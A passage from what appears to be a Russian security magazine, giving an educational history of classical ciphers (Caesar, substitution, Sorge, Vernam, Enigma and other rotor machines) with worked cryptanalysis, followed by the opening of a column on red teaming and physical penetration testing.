стойкие. На смену бумажным шифрам пришли шифровальные машины, кото-
рым не было равных среди людей. Даже опытному математику не удавалось
взломать шифр, рассчитанный на роторной машине. С появлением первых
компьютеров требования к защите информации возросли многократно.
  Зачем же нам знакомиться с такими древними и нестойкими шифрами, если
можно сразу прочитать про DES и RSA — и вуаля, почти специалист? Изуче-
ние первых шифров поможет лучше понять, зачем нужна та или иная операция
в современном алгоритме шифрования. Например, шифр перестановки, один
из первых примитивных алгоритмов, не был забыт, и перестановка — одна
из часто встречающихся операций в современном шифровании. Таким обра-
зом, чтобы лучше осознать, откуда на самом деле растут ноги у современных
алгоритмов, нужно оглянуться на несколько тысяч лет назад.

ИСТОРИЧЕСКИЕ ШИФРЫ И ПЕРВЫЕ ШИФРАТОРЫ
Согласно источникам, первые способы шифрования текста появились вместе
с зарождением письменности. Способы тайного письма применялись древни-
ми цивилизациями Индии, Месопотамии и Египта. В письменах Древней Ин-
дии упоминаются способы изменения текста, которые использовали не только
правители, но и ремесленники, желающие скрыть секрет мастерства. Истоком
криптографии считается использование специальных иероглифов в древне-
египетской письменности около четырех тысячелетий назад.
  Первым шифром, зародившимся в древних цивилизациях и актуальным,
в некотором роде, и по сей день, можно считать шифр замены. Чуть позже был
придуман шифр сдвига, который применялся Юлием Цезарем, почему и был
назван в его честь.
  Помимо шифров, нельзя не упомянуть о приборах для шифрования, кото-
рые разрабатывали древние математики. Например, скитала — первый шиф-
ратор, разработанный в Спарте. Представлял собой палку, на которую по всей
длине наматывалась лента пергамента. Текст наносился вдоль оси палки, по-
сле чего пергамент снимался, и получалось шифрованное сообщение. Клю-
чом служил диаметр палки. Однако такой способ шифрования был абсолютно
нестойким — автором взлома стал Аристотель. Он наматывал ленту перга-
мента на конусообразную палку до тех пор, пока не появлялись отрывки читае-
мого текста.
   Также ярким примером из мира древних шифраторов может стать диск
Энея — диск с отверстиями по количеству букв в алфавите. Нитка протягива-
лась последовательно в те отверстия, которые соответствовали буквам со-
общения. Получатель вытаскивал нитку, записывал последовательность букв
и читал секретное послание. Однако этот шифратор обладал существенным
недостатком — достать нитку и разгадать послание мог кто угодно.

Шифр сдвига
Это один из самых первых типов шифра. Процесс шифрования очень прост. Он
заключается в замене каждой буквы исходного сообщения на другую, отсто-
ящую от исходной на заданное количество позиций в алфавите. Это количе-
ство позиций называется ключом. При ключе, равном трем, этот метод называ-
ется шифром Цезаря. Император использовал его для секретной переписки.
Для того чтобы зашифровать сообщение, нужно построить таблицу подстановок:

 a b  c d e   f  g  h    i     j  k    l m n o p q  r  s   t  u  v w  x  y  z
 d  e    f  g  h      i       j   k      l m  n  o  p  q    r  s    t  u  v  w  x   y   z  a  b  c


Как видишь, во втором ряду символы алфавита сдвинуты на три позиции «на-
зад». Чтобы зашифровать сообщение, для каждого символа исходного текста
нужно взять соответствующий ему символ из таблицы подстановки.
Пример шифра
Исходный текст: Hi, Brut! How are you?
Шифрованный текст: Kl, Euxw! Krz duh brx?

Расшифрование
На этапе расшифрования мы имеем шифрованный текст и ключ, равный трем.
Чтобы получить исходный текст, ищем для каждого символа сдвиг на три по-
зиции к началу алфавита. Так, для первого символа K сдвиг три будет означать
символ H. Далее посимвольно расшифровываем текст, пока не получаем ис-
ходную фразу Hi, Brut! How are you?.

Криптоанализ
Легче всего такой шифр взломать простым перебором всех возможных зна-
чений ключа — их всего 25. Здесь все просто, и останавливаться смысла нет.
   Другой вариант — использовать частотный анализ текста. Для каждого
языка есть статистическая информация о частоте употребления каждой буквы
алфавита и наиболее часто встречающихся сочетаний букв. Для английского,
например, среднестатистические частоты употребления букв таковы:

  E 0,12702    S 0,06327    U 0,02758    P 0,01929   Q 0,00095
  T 0,09056    H 0,06094   M 0,02406    B 0,01492    Z 0,00074
  A 0,08167    R 0,05987   W 0,02360    V 0,00978
  O 0,07507   D 0,04253    F 0,02228    K 0,00772
     I 0,06966     L 0,04025   G 0,02015     J 0,00153
  N 0,06749    C 0,02782    Y 0,01974    X 0,00150


Что касается двухбуквенных сочетаний (биграмм), то можно заметить следу-
ющую тенденцию:

                Процентное                   Процентное   Биграмма                   Биграмма                содержание                  содержание
          th                 3,15              he                2,51
       an                 1,72                     in                1,69
         er                1,54                  re                1,48
        es                1,45              on                1,45
       ea                1,31                                 ti                 1,28
          at                1,24                    st                 1,21
       en                1,20              nd                 1,18
Идея в том, что в зашифрованном тексте самой часто встречаемой буквой
будет не эталонная e, а что-то другое. Соответственно, нам нужно найти са-
мую часто встречаемую букву в нашем шифре. Это и будет зашифрованная е.
А дальше нужно подсчитать ее сдвиг от е в таблице подстановок. Полученное
значение и есть наш ключ!

Шифр замены
Основной недостаток шифра сдвига заключается в том, что есть всего 25 воз-
можных значений ключа. Даже Цезарь начал подозревать, что его шифр не са-
мая лучшая идея. Поэтому на смену ему пришел шифр замены. Для того чтобы
воспользоваться этим алгоритмом, создается таблица с исходным алфавитом
и, непосредственно под ним, тот же алфавит, но с переставленными буквами
(или любой другой набор знаков):

 a b c d e  f g h   i    j  k   l m n o p q  r  s  t u  v w x y  z
 b e  x  g w     i  q  v     l  o  u m p     j    r  s    t  n  k  h    f  y  z  a d  c

Пример шифра
Действуем аналогично предыдущему шифру. Для каждого символа исходного
текста берем соответствующий ему из таблицы подстановки:
Исходный текст: Hi, Brut! How are you?
Шифрованный текст: Vl, Enfh!Vrz bnw drf?

Расшифрование
При расшифровании заменяем каждый символ шифротекста соответствую-
щим символом из известной нам таблицы подстановки: v => h, l => i и так да-
лее. После чего получаем исходную строку Hi, Brut! How are you?.

Криптоанализ
Криптоанализ этого шифра также выполняется методом частотного анализа
текста. Рассмотрим пример:

MRJGRJ LK HVW XBSLHBM RI QNWBH ENLHBLJ, LHK SRMLHLXBM, WXRJRPLX, BJG
XRPPWNXLBM XWJHNW. LH LK RJW RI HVW MBNQWKH XLHLWK LJ HVW ZRNMG BJG
HVW MBNQWKH XLHD LJ WFNRSW. LHK SRSFMBHLRJ LK BERFH 8 PLMMLRJ. MRJGRJ
LK GLYLGWG LJHR KWYWNBM SBNHK: HVW XLHD, ZWKHPLJKHWN, HVW ZWKH WJG, BJG
HVW WBKH WJG. HVW VWBNH RI MRJGRJ LK HVW XLHD, LHK ILJBJXLBM BJG EFKL-
JWKK XWJHNW. JFPWNRFK EBJUK, RIILXWK, BJG ILNPK BNW KLHFBHWG HVWNW,
LJXMFGLJQ HVW EBJU RI WJQMBJG, HVW KHRXU WAXVBJQW, BJG HVW RMG EBLM-
WD. IWZ SWRSMW MLYW VWNW, EFH RYWN B PLMMLRJ SWRSMW XRPW HR HVW XLHD HR
ZRNU. HVWNW BNW KRPW IBPRFK BJXLWJH EFLMGLJQK ZLHVLJ HVW XLHD. SWNVBSK
HVW PRKH KHNLULJQ RI HVWP LK HVW KH. SBFM\’K XBHVWGNBM, HVW QNWBHWKH RI
WJQMLKV XVFNXVWK. LH ZBK EFLMH LJ HVW 17HV XWJHFND ED KLN XVNLKHRSVWN
ZNWJ. HVW HRZWN RI MRJGRJ ZBK IRFJGWG ED OFMLFK XBWKBN BJG LJ 1066 NWE-
FLMH ED ZLMMLBP HVW XRJTFWNRN. LH ZBK FKWG BK B IRNHNWKK, B NRDBM SBM-
BXW, BJG B SNLKRJ. JRZ LH LK B PFKWFP.

Частотный анализ букв этого шифра показывает следующее (читай построчно,
буквы сортированы по частоте использования):

W — 88,    H — 74,     L — 67,     J — 55,     B — 54,     K — 52,
R — 51,    N — 41,     M — 36,     V — 35,     X — 29,     G — 27,
F — 23,    P — 16,     S — 16,     I — 15,     Z — 13,     E — 13,
D — 11,    Q — 10,     U — 5,      Y — 4,      T — 1,      O — 1,
A — 1

Вероятно, что W => e, так как это самая часто встречающаяся буква в шиф-
ре (смотри таблицу среднестатистических частот использования букв для ан-
глийского языка в предыдущем шифре).
  Дальше пробуем найти наиболее короткое слово, куда входит уже извест-
ная нам буква W => e. Видим, что сочетание HVW чаще всего встречается
в шифре. Нетрудно догадаться, что, скорее всего, это триграмма the, то есть
в тексте мы уже определили три символа. Если посмотреть на промежуточный
результат, сомнений не остается:

MRJGRJ LK the XBSLtBM RI QNeBt ENLtBLJ, LtK SRMLtLXBM, eXRJRPLX, BJG XRP-
PeNXLBM XeJtNe. Lt LK RJe RI the MBNQeKt XLtLeK LJ the ZRNMG BJG the
MBNQeKt XLtD LJ eFNRSe. LtK SRSFMBtLRJ LK BERFt 8 PLMMLRJ. MRJGRJ LK
GLYLGeG LJtR KeYeNBM SBNtK: the XLtD, ZeKtPLJKteN, the ZeKt eJG, BJG the
eBKt eJG. the heBNt RI MRJGRJ LK the XLtD, LtK ILJBJXLBM BJG EFKLJeKK
XeJtNe. JFPeNRFK EBJUK, RIILXeK, BJG ILNPK BNe KLtFBteG theNe, LJXMFGLJQ
the EBJU RI eJQMBJG, the KtRXU eAXhBJQe, BJG the RMG EBLMeD. IeZ SeRSMe
MLYe heNe, EFt RYeN B PLMMLRJ SeRSMe XRPe tR the XLtD tR ZRNU. theNe BNe
KRPe IBPRFK BJXLeJt EFLMGLJQK ZLthLJ the XLtD. SeNhBSK the PRKt KtNLULJQ
RI theP LK the Kt. SBFM\’K XBtheGNBM, the QNeBteKt RI eJQMLKh XhFNXheK.
Lt ZBK EFLMt LJ the 17th XeJtFND ED KLN XhNLKtRSheN ZNeJ. the tRZeN RI
MRJGRJ ZBK IRFJGeG ED OFMLFK XBeKBN BJG LJ 1066 NeEFLMt ED ZLMMLBP the
XRJTFeNRN. Lt ZBK FKeG BK B IRNtNeKK, B NRDBM SBMBXe, BJG B SNLKRJ. JRZ
Lt LK B PFKeFP.

Отлично, уже известны три буквы. Снова ищем наиболее короткие слова с но-
выми известными нам подстановками. Сочетание  it является частоупотре-
бляемым, и, поскольку буква t уже дешифрована (HVW => the), очевидно, что
в нашем тексте L => i (LH => it). После этого обращаемся к поиску биграмм is
и to, устанавливаем, что K => s, R => o. Затем обращаем внимание на триграм-
мы ~ing и and. Анализ текста показывает, что BJG, скорее всего, шифротекст
от and. После замены всех наиболее часто встречающихся символов получа-
ем текст:

Mondon is the XaSitaM oI QNeat ENitain, its SoMitiXaM, eXonoPiX, and
XoPPeNXiaM XentNe. it is one oI the MaNQest Xities in the ZoNMd and the
MaNQest XitD in eFNoSe. its SoSFMation is aEoFt 8 PiMMion. Mondon is
diYided into seYeNaM SaNts: the XitD, ZestPinsteN, the Zest end, and the
east end. the heaNt oI Mondon is the XitD, its IinanXiaM and EFsiness
XentNe. nFPeNoFs EanUs, oIIiXes, and IiNPs aNe sitFated theNe, inXMFdinQ
the EanU oI enQMand, the stoXU eAXhanQe, and the oMd EaiMeD. IeZ SeoSMe
MiYe heNe, EFt oYeN a PiMMion SeoSMe XoPe to the XitD to ZoNU. theNe
aNe soPe IaPoFs anXient EFiMdinQs Zithin the XitD. SeNhaSs the Post st-
NiUinQ oI theP is the st. SaFM\’s XathedNaM, the QNeatest oI enQMish Xh-
FNXhes. it Zas EFiMt in the 17th XentFND ED siN XhNistoSheN ZNen. the
toZeN oI Mondon Zas IoFnded ED OFMiFs XaesaN and in 1066 NeEFiMt ED
ZiMMiaP the XonTFeNoN. it Zas Fsed as a IoNtNess, a NoDaM SaMaXe, and a
SNison. noZ it is a PFseFP.

Далее действуя аналогично или просто подбирая буквы по смыслу, находим
исходный текст:

London is the capital of Great Britain, its political, economic, and
commercial centre. It is one of the largest cities in the world and the
largest city in Europe. Its population is about 8 million. London is
divided into several parts: the City, Westminster, the West End, and the
East End. The heart of London is the City, its financial and business
centre. Numerous banks, offices, and firms are situated there, including
the Bank of England, the Stock Exchange, and the Old Bailey. Few people
live here, but over a million people come to the City to work. There
are some famous ancient buildings within the City. Perhaps the most
striking of them is the St. Paul’s Cathedral, the greatest of English
churches. It was built in the 17th century by Sir Christopher Wren. The
Tower of London was founded by Julius Caesar and in 1066 rebuilt by
William the Conqueror. It was used as a fortress, a royal palace, and a
prison. Now it is a museum.

Как видишь, в этом криптоанализе нашим главным инструментом был стати-
стический анализ частот. Идем дальше!

Шифр Рихарда Зорге
Нельзя рассказывать о шифрах и ни слова не сказать о шпионах. В недалеком
прошлом, когда компьютеров еще не было, информацию стремились скрыть
в основном разведчики. Наука о шифровании не могла стоять на месте, ведь
служба Родине была самым важным и нужным ее предназначением. Кстати,
именно советские шифры, разработанные отечественными специалистами,
на многие десятилетия вперед определили вектор развития криптографии.
   Давай разберем довольно известный шифр Рихарда Зорге — советского
разведчика, который был направлен в Японию. Этот шифр продуман до мело-
чей. Шифрование ведется на английском языке. Первоначально нужно соста-
вить следующую таблицу:

    S        U        B      W         A         Y
    C        D         E          F       G        H
             I           J         K           L      M       N
   O         P       Q        R          T          V
     X          Z                    .              /

Сначала записываем в нее слово SUBWAY (это слово использовал сам Зор-
ге). Затем пишем все остальные буквы алфавита по порядку. Слеш означает
новое слово (разделитель), а точка обозначает себя. Далее наиболее часто
встречающиеся буквы английского алфавита (A, S, I, N, T, O, E, R) нумеруются
в порядке появления в таблице:

    0) S       U        B      W         5) A        Y
    C        D         3) E         F       G        H
     1) I          J         K           L      M         7) N
    2) O        P       Q         4) R        6) T        V
     X          Z                    .              /
Саму таблицу мы строим по горизонтали, записывая буквы рядами, а нумеру-
ем по вертикали, столбцами. Так улучшаются перемешивающие свойства.
  Далее таблица преобразуется  к следующему виду: сначала в стро-
ку по столбцам записываются наиболее часто встречаемые буквы в поряд-
ке нумерации (S, I, E, ...). А затем записываются и все остальные буквы, также
по столбцам в строки (С, X, U, D, J, ...). Такая таблица обеспечит хорошие пере-
мешивающие свойства и в то же время не «испортит» частотный анализ шиф-
ротекста:

        0     1     2     3     4     5     6     7     8     9
    -    S            I    O    E    R    A     T    N       -       -
  8    C     X    U    D     J    P     Z    B    K   Q
  9          .   W     F     L       /    G   M    Y    H     V


Таблица готова. Теперь можно зашифровать сообщение.

Пример шифра
Возьмем исходный текст:

Mr. X will  fly tomorrow.

Расставим слеши для разделения слов:

Mr./X/will/fly/tomorrow.

Разобьем текст на блоки по четыре символа (просто для удобства представ-
ления):

Mr./ X/wi ll/f ly/t omor row.

Теперь текст нужно зашифровать по нашей таблице. Алгоритм такой:
1. Для каждого исходного символа ищем соответствующую ему цифру в пер-
  вом столбце (для M это будет 9).
2. Для каждого исходного символа ищем соответствующую ему цифру в пер-
  вом ряду (для M это будет 6).
3. Записываем полученные символы один за другим (96). Если вместо симво-
   ла в первом ряду/столбце стоит прочерк, не пишем ничего:

   96 4 ...
   M  R ...

4. Переходим к следующему символу. И так далее.

В итоге у нас получится такой шифротекст:

9649094  81 94 911  93939492  9397946  29624  429190
M R. /   X  /  W I  L L / F   L Y / T  OM OR  ROW .

После этого шифротекст заново переразбивается на блоки одинаковой дли-
ны по пять символов. Оставшиеся символы, которые придутся на последнюю
незавершенную группу из пяти символов, можно просто отбросить. Если у нас
останется больше двух символов, то их нужно добить нулями до полной груп-
пы из пяти. Если один или два — можно отбросить, они не несут особо много
информации, и до них легко догадаются в штабе. В нашем случае лишних сим-
волов не осталось.
  После перегруппировки у нас получится вот такой шифротекст:

96490  94819  49119  39394  92939  79462  96244  29190

Далее нужно наложить на полученный шифротекст некую гамму. Если упрощен-
но, то гамма — это последовательность чисел, которая выбирается для сло-
жения с исходным шифротекстом. Например, если у нас есть гамма 1234 5678
9876, а исходный шифротекст выглядел как 12222  14444  1555, то конечный
шифротекст после наложения гаммы выглядит как их сумма — 1234+12222,
14444+5678, 9876+1555.
   Откуда брать гамму и как незаметно передать ее в штаб? Зорге выбирал
гамму из «Немецкого статистического ежегодника». Такое издание не должно
было вызвать удивление у японцев, так как Зорге приехал в страну под видом
немецкого журналиста. Зорге указывал страницу и столбец, откуда начина-
лась последовательность, которая была наложена на шифротекст в этом по-
слании. Например, 201-я страница и 43-й столбец. Эти данные он записывал
добавочным числом 20143 перед шифротекстом, который, в свою очередь,
уже шифровался гаммой.
   Конечно, сегодня стоит выбирать более известный источник для гаммы.
Подойдут любые распространенные табличные данные, не вызывающие по-
дозрения. Но для знакомства с шифром давай все же использовать аутентич-
ный исходник :).
Наш исходник для выбора гаммы. Ориджинал!
Предположим, мы выбрали 199-ю страницу и четвертую строку, шестой стол-
бец. Отсюда и начинается нужная гамма:

324 36 380 230 6683 4358 50 2841

В этом случае, чтобы наложить гамму, нужно сделать:

19946 {96490+324 94819+36 49119+380 39394+230 92939+6683 79462+4358
96244+50 29190+2841}

В итоге полученный шифротекст будет:

19946  96814  94855  49499  39624  99622  83820  96294  32031


Расшифрование
В Москве этот текст расшифровывали с помощью аналогичной таблицы. Пер-
вым делом анализировалось первое пятизначное число, и в справочнике на-
ходилась указанная последовательность гаммы:

{96814-324  94855-36  49499-380  39624-230  99622-6683  83820-4358  96294-
50  32031-2841}

Полученный шифротекст анализировали согласно таблице. Благодаря кон-
струкции таблицы каждое число имеет строго одно значение в буквах:

96490  94819  49119   39394   92939  79462  96244  29190
Mr.    /X/     wil     l/         fly   /to     morr   ow.

Получили исходный текст:

Mr. X will  fly tomorrow


Криптоанализ
Шифр Зорге так и не был взломан вражескими криптоаналитиками. Множе-
ство раз японские спецслужбы перехватывали шифротекст, но он так и оста-
нется в виде колонок пятизначных чисел, которые подшивались в дела непой-
манных шпионов.
Шифр Вернама
Во время Первой мировой войны криптологами активно использовался одно-
разовый шифр-блокнот, или шифр Вернама. Доказано, что он теоретически
абсолютно стойкий, однако ключ key должен быть той же длины, что и переда-
ваемое сообщение. Абсолютная стойкость — это свойство, при котором за-
шифрованное сообщение не поддается криптоанализу, так как не дает злоу-
мышленнику никакой информации об открытом тексте.
   Cуть шифра Вернама крайне проста. Для этого нужно вспомнить опера-
цию ⊕ «исключающее или» или сложение по модулю 2. Итак, для сообщения
plaintext шифротекст будет равен:

plaintext⊕key = ciphertext

То есть каждый символ исходного текста нужно сначала, перевести в двоич-
ный код и проксорить (сложить по модулю 2) с кодом соответствующего сим-
вола ключа. Далее перевести полученный символ шифротекста в буквенный
формат согласно таблице. Например, А — первый символ текста, B — первый
символ ключа. Тогда переводим оба в двоичный код, ксорим и получаем G:

A  00011
B  11001
   ----- +
G  11010

Во времена Первой мировой войны двоичные коды для символов задавались
в Международном телеграфном алфавите № 2 (International Telegraph Alphabet
No. 2, ITA2).
  На самом деле, несмотря на свою криптостойкость, этот шифр имеет боль-
ше минусов, нежели плюсов:
•  в качестве ключа должна быть абсолютно случайная последовательность —
   вероятно, придется стоять и подбрасывать кубик, чтобы сгенерировать та-
   кую;
•  для передачи необходим защищенный канал — сомнительно, что он всегда
   имелся под рукой во времена Первой мировой войны;
•  если третья сторона сможет каким-то образом узнать послание, она легко
   и восстановит ключи, и подменит сообщение;
•  требуется надежное уничтожение страницы блокнота — сжечь ее и съесть
   пепел, тогда враг точно не узнает, что было зашифровано.

Пример шифра
Исходный текст: HELLO
Ключ: AXHJB

Складываем побитово по модулю 2 и ищем, какой букве соответствует полу-
ченный код в телеграфном алфавите:

H⊕A = 10100⊕00011 = 10111 => Q
E⊕X = 00001⊕11101 = 11100 => M
L⊕H = 10010⊕10100 = 00110 => I
L⊕J = 10010⊕01011 = 11001 => B
O⊕B = 11000⊕11001 = 00001 => E

Шифрованный текст: QMIBE

Расшифрование
Расшифрование с помощью ключа выполняется аналогично шифровке:

ciphertext⊕key = plaintext


Криптоанализ
При правильном использовании ключа злоумышленник может только угадать
символы. Даже при условии, что у него будет неограниченное количество
шифротекстов, но все они будут зашифрованы на различных ключах из разных
символов, он будет иметь бесконечное множество вариантов исходного тек-
ста. При этом догадываться о значении исходного текста можно лишь по ко-
личеству символов.
   Криптоанализ шифра Вернама легко возможен в том случае, если при шиф-
ровании мы выбрали ключ с повторяющимися символами. Если злоумышлен-
нику удалось заполучить несколько текстов с перекрывающимися ключами, он
сможет восстановить исходный текст.
   Рассмотрим атаку, которая осуществима, если мы дважды при шифрова-
нии используем один и тот же ключ. Она называется атака вставки.
   Предположим, нам удалось перехватить зашифрованное сообщение
QMIVE. Мы пытаемся взломать шифр и убедили отправителя зашифровать
свое сообщение еще раз, но при этом поставить первым символом 1 (конеч-
но, отправитель должен быть безмерным простофилей, чтобы выполнить та-
кое условие, но, предположим, мы умеем убеждать). Тогда мы получаем шиф-
ротекст VDYBJY.
  Нам известно, что первый символ 1. Я вычисляю первый символ секретного
ключа key:
V⊕1 = 11110⊕11101 = 00011 => A

Далее. Нам известно, что первый шифротекст зашифрован этим же ключом.
Тогда мы можем вычислить первый символ открытого текста:

Q⊕A = 10111⊕00011 = 10100 => H

Дальше нам нужно найти второй символ ключа. Для этого мы берем второй
шифротекст, и, так как нам известен второй символ открытого текста, вычис-
ляем второй символ ключа:

H⊕D = 10100⊕01001 = 11101 => X

Применяем его к первому тексту и получаем:

M⊕X = 11100⊕11101 = 00001 => E

Аналогично далее:
•  складываем символ открытого текста с символом шифротекста => узнаем
   символ ключа;
•  складываем символ ключа с соответствующим символом шифротекста =>
   получаем символ открытого текста
•    ...

Такая последовательность операций повторяется, пока не станут известны
все символы открытого текста.

Шифровальные машины
Cо временем шифрование вручную стало казаться долгим и малополезным.
Криптографы постоянно шифровали, а криптоаналитики в это время отчаян-
но пытались взломать шифр. Нужно было ускорять и автоматизировать про-
цесс и усложнять алгоритм. Наиболее подходящим для модификации оказал-
ся шифр замены. Если текст, зашифрованный этим способом вручную, можно
было без особого труда восстановить, то машина могла проделать эту опера-
цию несколько раз, и восстановить текст становилось очень трудно.
   Итак, основным механизмом работы шифратора был диск с нанесенными
с двух сторон контактами, соответствующими алфавитам открытого и шифро-
ванного текста. Контакты соединялись между собой по некоторому правилу,
называемому коммутацией диска. Эта коммутация определяла замену букв
при начальном положении диска. При изменении положения диска коммута-
ция менялась и алфавит для шифрования сдвигался.
Пример работы
Пусть начальное положение диска задает подстановку:

 a b c d e  f g h   i    j  k   l m n o p q  r  s  t u  v w x y  z
 b e  x  g w     i  q  v     l  o  u m p     j    r  s    t  n  k  h    f  y  z  a d  c

После того как первая буква исходного текста заменена, ротор поворачивает-
ся и подстановка сдвигается на один символ:

 a b c d e  f g h   i    j  k   l m n o p q  r  s  t u  v w x y  z
 e  x  g w     i  q  v     l  o  u m p     j    r  s    t  n  k  h    f  y  z  a d  c b

Вторая буква будет зашифрована согласно новому алфавиту. А после ее за-
мены ротор сдвигается вновь, и так далее по количеству символов в исходном
шифруемом сообщении.

Энигма
Первой роторной машиной шифрования была «Энигма», состоявшая на воору-
жении Германии во время Второй мировой войны. Она имела три ротора, свя-
занных между собой. При повороте первого ротора соединенное с ним кольцо
попадает в паз второго диска и толкает его. Аналогично итерации третьего
ротора контролируются вторым ротором. В итоге при каждом нажатии на кла-
вишу машины одна и та же буква кодируется совершенно разными значениями.
  При шифровании необходимо было учитывать начальное положение ро-
торов, их порядок и положения колец. Для двойной замены букв использует-
ся штекерная панель. Рефлектор осуществляет завершающую подстановку
для контроля соответствия между операциями зашифрования и расшифрова-
ния. Взгляни на конструкцию «Энигмы»:





                                                                      Устройство
                                                              шифровальной
                                                        машины
                                                                 «Энигма»
На рисунке жирной линией выделено, как буква A вводится с клавиатуры, ко-
дируется штекером, проходит через три ротора, заменяется на рефлекторе
и выходит зашифрованной буквой D.
   «Энигма»  долгое  время
считалась неуязвимой. Немцы                                                          Шифровальная
ежедневно меняли положение                            машина
штекеров, диски и их компонов-                               «Энигма»
ку и положение. Во время во-
енных действий они ежедневно
кодировали короткую после-
довательность  букв,  которая
шифровалась дважды и пере-
давалась в самом начале сооб-
щения. Адресат дешифровал
ключ и устанавливал настройки
машины согласно этому ключу.
Именно это многократное ис-
пользование одного и того же
ключа позволило аналитикам
из  Блетчли-Парка  (главного
шифровального  подразделе-
ния Великобритании) взломать
немецкий шифр.
  На самом деле механизм
«Энигмы» не является стойким,
так как штекеры и рефлектор
выполняют  взаимоисключаю-    Шифровальная
                                машина
щие операции. Пользуясь ча-                                    «Сигаба»
стотным анализом для доста-
точно большого шифротекста,
можно подобрать положение
роторов брутфорсом. Именно
из-за этих уязвимостей «Эниг-
ма» остается лишь экспонатом
в музее Блетчли-Парка.

Сигаба
Спустя десять лет американ-
скими военными была разра-
ботана роторная шифроваль-
ная машина «Сигаба», которая
значительно превзошла по характеристикам свою прародительницу. «Сига-
ба» имеет три блока по пять роторов и печатающий механизм. Шифрование
на этой машине использовалось американскими военными и военно-морским
флотом вплоть до 1950-х годов, пока ее не сменила более новая модификация
KL-7. Как известно, эта роторная машина так и не была взломана..





  Шифровальная машина Purple



Purple
Говоря о знаменитых криптографических механизмах, нельзя не упомянуть
о японской шифровальной машине Purplе, как ее назвали американцы. Шиф-
рование в Purple также основывалось на движении четырех роторов, а секрет-
ный ключ задавался один раз в день. Текст вводился с клавиатуры, при помо-
щи роторов заменялся на шифрованный и выводился напечатанным на бумаге.
При расшифровании процесс последовательного прохождения через роторы
повторялся в обратном порядке. Такая система является совершенно стой-
кой. Однако на практике ошибки при выборе ключей привели к тому, что Purple
повторила судьбу немецкой «Энигмы». Она была взломана американским от-
делом криптоаналитиков.

ВЫВОДЫ
Опыт истории криптографии показывает нам значимость выбора секретного
ключа и частоты смены ключа. Ошибки в этом тяжелом процессе превращают
любую систему шифрования в менее стойкую, чем она могла бы быть. В сле-
дующий раз поговорим про распределение ключей.
ВЗЛОМ: Колонка Юрия Гольцева
   SPY
 GAMES





                  Юрий Гольцев
                                                      @ygoltsev


Тестирование на проникновение (penetration testing) —
метод оценки безопасности компьютерных систем или
сетей средствами моделирования атаки злоумышленни-
ка. Для кого-то это хобби, для кого-то работа, для кого-то
это стиль жизни. На страницах нашего журнала мы поста-
раемся познакомить тебя с профессией настоящего хаке-
ра на службе корпорации, с задачами, которые перед ним
ставятся, и их решениями.
INTRO
Возможно, у тебя сложилось впечатление, что работа пентестера — достаточ-
но непыльная штука: светлый и уютный офис, горячая и вкусная еда, спокой-
ствие и благополучие. Стабильность :). Это далеко от действительности, осо-
бенно когда разговор заходит о таком понятии, как full scope penetration testing,
что, грубо говоря, аналогично термину red teaming.
  Подобный проект, помимо характерных для пентеста вещей, подразуме-
вает под собой углубление в такие пласты, как безопасность коммуникаций,
социальная инженерия и физическая безопасность. В реалиях российско-
го бизнеса ИБ типовые тесты на проникновение далеки от подобных задач,
но в моей практике встречались похожие. И сегодня мы поговорим именно
о тех составляющих работ, которые заставляют нас покинуть уютный офис
и почувствовать себя настоящим шпионом.





Кадр из кинофильма Sneakers

HISTORY
Что такое red team? Этот термин появился в армии США — им обозначали бо-
евую единицу, перед которой ставилась задача оценить эффективность той
или иной боевой единицы. Простой пример: если необходимо натренировать
боевую единицу на защиту периметра охраняемого объекта, то кто-то другой
должен выступать в роли атакующего. Так и появились «красные команды».
  В дальнейшем предприимчивые граждане, в большинстве случаев в про-
шлом каким-либо образом связанные с военными структурами США, стали
оказывать услуги, аналогичные тем, которые оказывали на службе, но уже
для корпораций. Наглядно подобные операции были продемонстрированы
широкой публике в фильме Sneakers.
  Компьютеры в те времена еще не настолько проникли в повседневную
жизнь, чтобы стать одной из составляющих периметра корпорации. Основной
целью подобных работ, как и сейчас для пентеста, была независимая оценка
текущего уровня защищенности организации. То же тестирование на проник-
новение, но со своим периметром и с моделью нарушителя, которая напрямую
зависит от периметра.
   Вот основные навыки, которыми необходимо было обладать участникам ко-
манды хакеров (а они, безусловно, были хакерами): понимание принципов си-
стем физической безопасности и опыт работы с ними; навыки взлома замков;
отменные навыки социальной инженерии, а также понимание устройства всех
используемых на тот момент коммуникаций — начиная от вентиляции и закан-
чивая телефонией.
   Проект считался удачным не когда взяты привилегии администратора до-
мена AD, а когда получен доступ к информации, составляющей коммерческую
тайну, которая в те времена частенько была изложена лишь на бумаге. С раз-
витием технологий все больше и больше уклон подобных работ стал смещать-
ся в сторону сетевой безопасности, где хакеры и консультанты по ИБ нашли
себе легальное применение.
  Многие мои знакомые, занимающиеся тестами на проникновение на Запа-
де, при оказании услуг в сфере ИБ-консалтинга, помимо привычных нам пен-
тестов, также проводят оценку безопасности периметра с точки зрения фи-
зического проникновения. К слову сказать, я вообще не верил, что подобные
услуги до сих пор актуальны, но меня в этом разуверили Хьюго Фортье и Кевин
Митник. От Хьюго я, конечно, мог этого ожидать (он вообще тру олдскул хард-
кор тип), но Митник мне казался «говорящей головой», не более. Мое мне-
ние кардинально изменилось после личного знакомства в хакспейсе «Ней-
рон» и его рассказов о том, как и какие именно услуги оказывает его контора
MitnickSecurity. Оказалось, что ребята не брезгуют выездами к заказчикам не-
зависимо от их местоположения и, используя все возможные средства, прео-
долевают физический периметр.

IMHO
Почему же у нас непопулярна подобная услуга? На мой взгляд, помешало от-
сутствие в индустрии людей, которые были бы готовы ее предоставлять. Под-
готовка требует времени и денег, да и заказчикам тоже еще нужно объяснить,
что тестирование защиты их физического периметра — дело важное и нужное.
  В России рынок услуг в сфере информационной безопасности разви-
вался именно благодаря людям, которые эти услуги продавали любыми воз-
можными и невозможными способами. Тем временем потребности в услугах
в сфере физической безопасности покрыли всевозможные ЧОПы. Их методы
и подходы, по всей видимости, очень далеки от тех, которые применяются
«ред тимами».
  В современных реалиях физическая безопасность сводится к защите ско-
рее человеческих жизней, нежели информации. К тому же существенно изме-
нилась и модель нарушителя — в большинстве случаев он старается избегать
любых действий, которые в кратчайшие сроки могут ограничить его свободу
перемещения.

EXPIRIENCE
Единственная разновидность нарушителя, для моделирования атаки которой
нужно уметь преодолевать физический периметр, — это нарушитель, отчаяв-
шийся проникнуть во внешний сетевой периметр.
   Такая модель непопулярна у исполнителей, но вызывает энтузиазм у заказ-
чиков, если о ней заговорить. Дай им волю, и тебе придется нанимать в ко-
манду мужчину 35–40 лет с неприметной внешностью и навыками рукопашных
боев без правил, который в случае чего сможет вырубить подоспевших охран-
ников, пока ты вскрываешь замок.
